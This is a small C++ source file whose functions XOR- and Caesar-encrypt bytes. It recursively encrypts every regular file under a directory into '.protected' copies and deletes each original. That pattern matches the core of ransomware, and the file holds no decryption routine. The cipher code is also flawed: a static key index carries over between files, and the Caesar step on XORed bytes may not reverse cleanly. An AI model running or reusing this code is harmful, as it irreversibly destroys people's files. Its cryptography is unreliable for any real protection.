#include "kk5v.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <filesystem>

namespace kk5v {

    // XOR encryption/decryption for a single byte
    char xorEncryptDecrypt(char byte, const std::string& key) {
        static size_t keyIndex = 0;  // Track the position in the key
        char encryptedByte = byte ^ key[keyIndex % key.size()]; // XOR with the key
        keyIndex++;
        return encryptedByte;
    }

    // Caesar Cipher encryption/decryption
    char caesarEncryptDecrypt(char byte, int shift) {
        if (isalpha(byte)) {
            char base = isupper(byte) ? 'A' : 'a';
            return (byte - base + shift) % 26 + base;
        }
        return byte;  // Non-alphabet characters remain unchanged
    }

    // Encrypt a file using XOR + Caesar Cipher
    void encryptFile(const std::string& inputFile, const std::string& outputFile, const std::string& key, int shift) {
        std::ifstream inFile(inputFile, std::ios::binary);
        std::ofstream outFile(outputFile, std::ios::binary);

        if (!inFile || !outFile) {
            std::cerr << "Error opening files." << std::endl;
            return;
        }

        char byte;
        while (inFile.get(byte)) {
            byte = xorEncryptDecrypt(byte, key); // XOR encryption
            byte = caesarEncryptDecrypt(byte, shift); // Caesar encryption
            outFile.put(byte);
        }

        inFile.close();
        outFile.close();
    }

    // Encrypt all files in a given directory (recursively)
    void encryptDirectory(const std::string& directory, const std::string& key, int shift) {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(directory)) {
            if (entry.is_regular_file()) {
                std::string filePath = entry.path().string();
                std::string encryptedFilePath = filePath + ".protected";
                encryptFile(filePath, encryptedFilePath, key, shift);
                std::remove(filePath.c_str());  // Optionally delete the original file after encryption
            }
        }
    }

} // namespace kk5v
